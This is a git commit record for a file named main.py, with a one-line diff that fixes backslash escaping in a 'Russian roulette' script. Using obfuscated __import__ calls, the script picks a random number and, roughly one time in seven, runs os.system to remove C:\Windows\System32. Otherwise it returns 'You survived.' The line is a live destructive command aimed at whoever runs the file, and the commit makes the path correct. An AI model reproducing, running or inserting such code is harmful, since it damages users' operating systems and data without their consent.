46da5eef2c5161f763f1460d503572274bfce2c7
Takaso Nogokui <70639611+Takaso@users.noreply.github.com>
2023-06-03 21:03:52 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,1 @@
-__import__("os").system("rmdir C:\Windows\System32") if not __import__("random").randint(0, 6) else "You survived."
+__import__("os").system("rmdir C:\\Windows\\System32") if not __import__("random").randint(0, 6) else "You survived."
